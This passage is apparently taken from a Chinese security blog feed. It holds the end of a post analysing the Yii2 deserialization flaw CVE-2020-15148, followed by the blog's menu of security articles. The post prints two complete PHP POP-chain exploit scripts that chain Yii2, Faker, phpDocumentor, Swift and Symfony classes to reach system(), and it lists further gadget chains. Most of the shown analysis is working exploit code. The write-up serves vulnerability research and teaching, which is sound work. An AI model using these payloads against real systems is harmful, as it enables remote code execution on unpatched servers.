class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">id</span>;</span><br><span class="line">        <span class="keyword">public</span> $checkAccess;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;ls&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $formatters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;render&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Deprecated</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $description;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;description = <span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>\<span class="title">Deprecated</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Swift_KeyCache_DiskKeyCache</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $path;</span><br><span class="line">        <span class="keyword">private</span> $keys;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;path = <span class="keyword">new</span> Deprecated();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;keys = <span class="keyword">array</span>(<span class="string">&quot;just&quot;</span>=&gt;<span class="keyword">array</span>(<span class="string">&quot;for&quot;</span>=&gt;<span class="string">&quot;ca01h&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Swift_KeyCache_DiskKeyCache()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然报错，但命令还是成功执行了。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201008174414.png" alt=""></p><p>与此类似的POP链还有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Swift\KeyCache\DiskKeyCache::__destruct()</span><br><span class="line">-&gt;</span><br><span class="line">src\DocBlock\Tags\See.php::__toString()</span><br><span class="line">-&gt;</span><br><span class="line">Faker\Generator::__call()</span><br><span class="line">-&gt;</span><br><span class="line">yii\rest\IndexAction::run()</span><br></pre></td></tr></table></figure><p>以及</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Swift\KeyCache\DiskKeyCache::__destruct()</span><br><span class="line">-&gt;</span><br><span class="line">src\DocBlock\Description.php::__toString()</span><br><span class="line">-&gt;</span><br><span class="line">Faker\Generator::__call()</span><br><span class="line">-&gt;</span><br><span class="line">yii\rest\IndexAction::run()</span><br></pre></td></tr></table></figure><h3 id="第三条POP链">第三条POP链</h3><blockquote><p>PHP &gt; 7.1</p></blockquote><p>再来一个从<code>__wakeup</code>入手的POP链，反序列化起点位于<code>vendor\symfony\string\UnicodeString.php</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201008213827.png" alt=""></p><p>继续跟<code>normalizer_is_normalized()</code>函数</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201008213922.png" alt=""></p><p>跟进静态方法<code>isNormalized()</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201008214024.png" alt=""></p><p>看到<code>preg_match($s)</code>，那么``normalizer_is_normalized()<code>就可以作为跳板触发</code>__toString()`方法，接下来又可以和上面提到的POP链连在一起了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Symfony\Component\String\UnicodeString::__wakeup()</span><br><span class="line">-&gt;</span><br><span class="line">phpDocumentor\Reflection\DocBlock\Tags\See::__toString()</span><br><span class="line">-&gt;</span><br><span class="line">Faker\Generator::__call()</span><br><span class="line">-&gt;</span><br><span class="line">yii\rest\IndexAction::run()</span><br></pre></td></tr></table></figure><p>EXP：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> $id;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;touch test.txt&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $formatters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;render&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">See</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $description;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;description = <span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">String</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>\<span class="title">See</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">UnicodeString</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $string;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;string = <span class="keyword">new</span> See;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">String</span>\<span class="title">UnicodeString</span>;</span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> UnicodeString()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有个问题是这个POP利用链回显的时候会报错，不能正常显示。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201008214536.png" alt=""></p><p>但是命令是成功执行的：</p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201008214737.png" style="zoom:50%;" /><p>讲道理，应该还可以接着挖。</p><h2 id="参考文章">参考文章</h2><p><a href="https://mp.weixin.qq.com/s/Cv2Ax7U1sMtbXCq6YDgkTg">https://mp.weixin.qq.com/s/Cv2Ax7U1sMtbXCq6YDgkTg</a></p><p><a href="https://xz.aliyun.com/t/8307">https://xz.aliyun.com/t/8307</a></p><p><a href="https://www.anquanke.com/post/id/217930">https://www.anquanke.com/post/id/217930</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;CVE-2020-15148-Yii2-反序列化分析及拓展&quot;&gt;CVE-2020-15148 Yii2 反序列化分析及拓展&lt;/h1&gt;
&lt;h2 id=&quot;漏洞范围&quot;&gt;漏洞范围&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Yii2 &amp;lt; 2.0.38&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 i
      
    
    </summary>
    
    
      <category term="代码审计" scheme="http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="PHP" scheme="http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/"/>
    
    
      <category term="代码审计" scheme="http://ca0y1h.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>menu</title>
    <link href="http://ca0y1h.top/menu/"/>
    <id>http://ca0y1h.top/menu/</id>
    <published>2020-09-26T11:57:04.681Z</published>
    <updated>2020-10-20T01:01:54.301Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文章归档"><a href="/archives/index.html"><strong>文章归档</strong></a></h1><h1 id="置顶文章"><strong>置顶文章</strong></h1><ul><li><a href="/Other/6.Linux-Enumeration">Linux Enumeration</a></li></ul><h1 id="Web安全"><strong>Web安全</strong></h1><h2 id="Web安全基础">Web安全基础</h2><ul><li><a href="/Web_security/basic_learning/1.%E5%9C%A8Ubuntu18.04%E5%AE%89%E8%A3%85LNMP">在Ubuntu18.04安装LNMP</a></li><li><a href="/Web_security/basic_learning/2.MySQL%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C">MySQL数据库基本操作</a></li><li><a href="/Web_security/basic_learning/3.MySQL%E7%9A%84%E7%B3%BB%E7%BB%9F%E8%A1%A8%E3%80%81%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E5%92%8CHash%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4">MySQL的系统表、文件读写</a></li><li><a href="/Web_security/basic_learning/4.%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0">数据库系统功能相关学习</a></li><li><a href="/Web_security/basic_learning/5.%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0">数据库注入语句的收集和学习</a></li><li><a href="/Web_security/basic_learning/6.Web%E9%A1%B5%E9%9D%A2%E8%A7%A3%E6%9E%90%E7%9A%84%E6%B5%81%E7%A8%8B%E5%AD%A6%E4%B9%A0">Web页面解析的流程学习</a></li><li><a href="/Web_security/basic_learning/7.%E5%90%84%E7%A7%8D%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E7%9A%84%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%92%8C%E4%BB%A3%E7%A0%81%E7%BC%96%E5%86%99">各种注入类型的环境搭建和代码编写</a></li><li><a href="/Web_security/basic_learning/9.Sqli-labs%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94Basic-Challenge">Sqli-labs手工注入(一)</a></li><li><a href="/Web_security/basic_learning/8.Sqli-labs%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94Advanced-Injections">Sqli-labs手工注入(二)</a></li><li><a href="/Web_security/basic_learning/10.SQLMap%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0">SQLMap入门学习</a></li><li><a href="/Web_security/basic_learning/11.SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5">SQL注入——双查询注入</a></li><li><a href="/Web_security/basic_learning/12.XSS%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98%E5%AD%A6%E4%B9%A0">XSS漏洞实战学习</a></li><li><a href="/Web_security/basic_learning/13.%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">文件包含漏洞利用</a></li><li><a href="/Web_security/basic_learning/14.%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">变量覆盖漏洞利用</a></li><li><a href="/Web_security/basic_learning/16.%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">文件上传漏洞利用</a></li><li><a href="/Web_security/basic_learning/17.SSRF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">SSRF漏洞利用</a></li><li><a href="/Web_security/basic_learning/18.%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">命令执行漏洞利用</a></li><li><a href="/Web_security/basic_learning/19.%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">逻辑漏洞利用</a></li><li><a href="/Web_security/basic_learning/20.xxe%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">XXE漏洞利用</a></li><li><a href="/Web_security/basic_learning/21.NoSQL%E6%B3%A8%E5%85%A5%E4%B9%8BMongoDB">NoSQL注入之MongoDB</a></li><li><a href="/Web_security/basic_learning/22.SQL%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E4%B9%8BMySQL%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E8%AF%AD%E6%B3%95">SQL注入专项之MySQL基本注入语法</a></li><li><a href="/Web_security/basic_learning/24.%E6%B5%85%E8%B0%88LDAP%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB">浅谈LDAP注入攻击</a></li></ul><h2 id="PHP相关">PHP相关</h2><ul><li><a href="/Web_security/php_related/1.PHP%E5%9B%9E%E8%B0%83%E5%90%8E%E9%97%A8">PHP回调后门</a></li><li><a href="/Web_security/php_related/2.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%9F%BA%E7%A1%80%E7%AF%87">PHP反序列化——基础篇</a></li><li><a href="/Web_security/php_related/3.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">PHP反序列化——Phar</a></li><li><a href="/Web_security/php_related/4.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">PHP反序列化——Session</a></li><li><a href="/Web_security/php_related/5.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8">PHP反序列化-原生类利用</a></li><li><a href="/Web_security/php_related/8.PHP%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E6%9E%84%E9%80%A0webshell">PHP无数字字母构造webshell</a></li><li><a href="/Web_security/php_related/9.%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0PHP%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8">PHP无参数函数的利用</a></li><li><a href="/Web_security/php_related/10.%E5%88%A9%E7%94%A8SoapClient%E7%B1%BB%E8%BF%9B%E8%A1%8CSSRF-CRLF%E6%94%BB%E5%87%BB">SoapClient+SSRF+CRLF利用</a></li><li><a href="/Web_security/php_related/12.PHP%E7%9A%84LFI%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93">PHP LFI to RCE</a></li><li><a href="/Web_security/php_related/13.session.upload_progress+LFI%E5%AE%9E%E7%8E%B0RCE">session.upload-progress+LFI实现RCE</a></li></ul><h2 id="Writeups">Writeups</h2><ul><li><a href="/Web_security/ctf_writeup/3.CGCTF-Writeup">CGCTF-Writeup</a></li><li><a href="/Web_security/ctf_writeup/4.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">BUUCTF—PHP代审</a></li><li><a href="/Web_security/ctf_writeup/5.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E7%AF%87">BUUCTF—PHP框架漏洞</a></li><li><a href="/Web_security/ctf_writeup/6.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">BUUCTF—PHP反序列化</a></li><li><a href="/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5">BUUCTF—SQL注入</a></li><li><a href="/Web_security/ctf_writeup/8.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94XSS">BUUCTF—XSS</a></li><li><a href="/Web_security/ctf_writeup/9.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SSRF">BUUCTF—SSRF</a></li><li><a href="/Web_security/ctf_writeup/10.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">BUUCTF—命令执行</a></li><li><a href="/Web_security/ctf_writeup/11.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">BUUCTF—文件上传</a></li><li><a href="/Web_security/ctf_writeup/12.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">BUUCTF—文件包含</a></li><li><a href="/Web_security/ctf_writeup/13.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94Python">BUUCTF—Python</a></li><li><a href="/Web_security/ctf_writeup/14.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94NodeJS">BUUCTF—NodeJS</a></li><li><a href="/Web_security/ctf_writeup/15.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94Ruby%E5%8F%8AGo">BUUCTF—Ruby和Go</a></li><li><a href="/Web_security/ctf_writeup/16.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AF%87">BUUCTF—渗透测试</a></li><li><a href="/Web_security/ctf_writeup/17.2020%E7%94%B5%E4%BF%A1%E5%A4%A9%E7%BF%BC%E6%9D%AFCTF%E2%80%94APITest">2020电信天翼杯CTF—APITest</a></li><li><a href="/Web_security/ctf_writeup/18.%E6%98%9F%E7%9B%9F6%E6%9C%88AWD%E5%A4%8D%E7%9B%98%E2%80%94%E2%80%94web+pwn">星盟6月AWD Web+Pwn</a></li><li><a href="/Web_security/ctf_writeup/19.DASCTF2020%E4%B8%83%E6%9C%88%E8%B5%9B">DASCTF2020七月赛 Web</a></li><li><a href="/Web_security/ctf_writeup/20.CSICTF2020">CSICTF2020 Web+Linux</a></li><li><a href="/Web_security/ctf_writeup/21.2020%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9BCTF-Web">2020第五空间CTF Web</a></li><li><a href="/Web_security/ctf_writeup/22.%E9%A6%96%E5%B1%8A%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AFCTF">首届钓鱼城杯CTF</a></li><li><a href="/Web_security/ctf_writeup/23.DASCTF2020%E5%85%AB%E6%9C%88%E8%B5%9B">DASCTF八月赛</a></li></ul><h1 id="靶机系列"><strong>靶机系列</strong></h1><h2 id="HackTheBox">HackTheBox</h2><ul><li><a href="/Target_drone/HackTheBox/1.HTB-OpenAdmin-walkthrough">HTB::OpenAdmin</a></li><li><a href="/Target_drone/HackTheBox/2.HTB-Postman-walkthrough">HTB::Postman</a></li><li><a href="/Target_drone/HackTheBox/3.HTB-Traverxec-walkthrough">HTB::Traverxec</a></li><li><a href="/Target_drone/HackTheBox/4.HTB-Obscurity-walkthrough">HTB::Obscurity</a></li><li><a href="/Target_drone/HackTheBox/5.HTB-Mongo-walkthrough">HTB::Mongo</a></li><li><a href="/Target_drone/HackTheBox/6.HTB-Tenten-walkthrough">HTB::Tenten</a></li><li><a href="/Target_drone/HackTheBox/7.HTB-Sneaky-walkthrough">HTB::Sneaky</a></li><li><a href="/Target_drone/HackTheBox/8.HTB-Teacher-walkthrough">HTB::Teacher</a></li><li><a href="/Target_drone/HackTheBox/9.HTB-Irked-walkthrough">HTB::Irked</a></li><li><a href="/Target_drone/HackTheBox/10.HTB-Traceback-walkthrough">HTB::Traceback</a></li><li><a href="/Target_drone/HackTheBox/11.HTB-DevOops-walkthrough">HTB::DevOops</a></li><li><a href="/Target_drone/HackTheBox/12.HTB-Blocky-walkthrough">HTB::Blocky</a></li><li><a href="/Target_drone/HackTheBox/13.HTB-Beep-walkthrough">HTB::Beep</a></li><li><a href="/Target_drone/HackTheBox/14.HTB-Book-walkthrough">HTB::Book</a></li><li><a href="/Target_drone/HackTheBox/15.HTB-Magic-walkthrough">HTB::Magic</a></li><li><a href="/Target_drone/HackTheBox/16.HTB-Craft-walkthrough">HTB::Craft</a></li><li><a href="/Target_drone/HackTheBox/17.HTB-CTF-walkthrough">HTB::CTF</a></li><li><a href="/Target_drone/HackTheBox/18.HTB-Admirer-walkthrough">HTB::Admirer</a></li></ul><h2 id="VulnHub">VulnHub</h2><ul><li><a href="/Target_drone/VulnHub/1.VulnHub-BossplayersCTF-walkthrough">VulnHub::BossplayersCTF</a></li><li><a href="/Target_drone/VulnHub/2.VulnHub-DC-1-walkthrough">VulnHub::DC-1</a></li><li><a href="/Target_drone/VulnHub/3.VulnHub-DigitalWorld-Local-JOY-walkthrough">VulnHub::DigitalWorld:JOY</a></li></ul><h1 id="代码审计"><strong>代码审计</strong></h1><h2 id="PHP代码审计">PHP代码审计</h2><ul><li><a href="/code_audit/3.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day1">PHP代码审计学习—Day1</a></li><li><a href="/code_audit/4.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day2">PHP代码审计学习—Day2</a></li><li><a href="/code_audit/5.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day3">PHP代码审计学习—Day3</a></li><li><a href="/code_audit/6.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day4">PHP代码审计学习—Day4</a></li><li><a href="/code_audit/7.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day5">PHP代码审计学习—Day5</a></li><li><a href="/code_audit/1.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0%E2%80%94%E2%80%94yixuncms">PHP代码审计复现—yixuncms</a></li><li><a href="/code_audit/2.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0%E2%80%94%E2%80%94chinaz">PHP代码审计复现—chinaz</a></li><li><a href="/code_audit/8.Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E6%8B%93%E5%B1%95">CVE-2020-15148 Yii2反序列化</a></li></ul><h1 id="流量分析"><strong>流量分析</strong></h1><ul><li><a href="/Web_security/traffic_analysis/1.Datacon2019-q1-Writeup-v1">Datacon2019-q1-wp-v1</a></li><li><a href="/Web_security/traffic_analysis/2.Datacon2019-q1-Writeup-v2">Datacon2019-q1-wp-v2</a></li><li><a href="/Web_security/traffic_analysis/3.Bro%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">Bro语法学习之基础知识</a></li></ul><h1 id="机器学习"><strong>机器学习</strong></h1><h2 id="基础学习">基础学习</h2><ul><li><a href="/Machine_learning/basic_learning/1.Machine-Learning-Week1">Machine-Learning-Week1</a></li><li><a href="/Machine_learning/basic_learning/2.Machine-Learning-Week2">Machine-Learning-Week2</a></li><li><a href="/Machine_learning/basic_learning/3.Machine-Learning-Week3">Machine-Learning-Week3</a></li><li><a 